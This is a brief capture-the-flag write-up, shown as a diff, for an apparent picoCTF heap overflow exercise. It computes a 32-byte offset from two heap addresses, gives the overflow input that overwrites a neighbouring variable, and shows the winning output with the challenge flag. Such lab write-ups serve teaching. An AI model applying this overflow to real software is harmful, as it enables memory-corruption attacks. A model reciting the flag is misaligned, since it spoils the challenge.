@@ -1,0 +1,29 @@
+Firstly run the instance with "Launc instance". After that connect to server with netcat.
+Challenge provided us source code.
+We see if we allocate "pico" to 0x63c3882552d0 address, we get the flag.
+Challenge shows us the address we can write and the adress we should allocate"pico"
+So, we will find how many characters we should write with subtracting these addresses.
+> 0x63c3882552d0-0x63c3882552b0 = 32 as decimal
+So, after writing 32 character, we write pico and get flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico
+
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x56c2bf6842b0  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico
++-------------+----------------+
+[*]   0x56c2bf6842d0  ->   pico
++-------------+----------------+
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 4
+
+YOU WIN
+picoCTF{my_first_heap_overflow_c3935a08}
+
+
